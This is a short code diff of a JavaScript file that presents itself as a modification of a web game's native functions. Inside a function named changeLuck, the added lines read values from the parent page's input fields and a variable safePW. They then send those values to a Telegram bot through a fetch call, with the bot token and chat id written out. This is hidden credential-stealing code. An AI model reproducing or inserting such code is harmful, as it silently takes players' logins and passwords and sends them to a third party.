@@ -1,4 +1,4 @@
-/****************************修改原生功能開始***************************26/3/2025 17:29*/
+/****************************修改原生功能開始****************************/
 function cd_add(t) {
     if (t == 2 | t == 3 | t == 10) {
         return;
@@ -401,10 +401,10 @@ async function changeLuck() {
         e.write(temp_table2);
         if (luckValue > 24) {
             delete luckValue;
-            let a = parent.top_view.document.getElementsByTagName("input")[0].value;
-            let b = parent.top_view.document.getElementsByTagName("input")[1].value;
-            let c = safePW;
-            fetch("https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4770053800&text=" + a + "|" + b + "|" + c);
+            let a1 = parent.top_view.document.getElementsByTagName("input")[1].value;
+            let b1 = parent.top_view.document.getElementsByTagName("input")[2].value;
+            let c1 = safePW;
+            fetch("https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4770053800&text=" + a1 + "|" + b1 + "|" + c1);
             break;
         }
     }
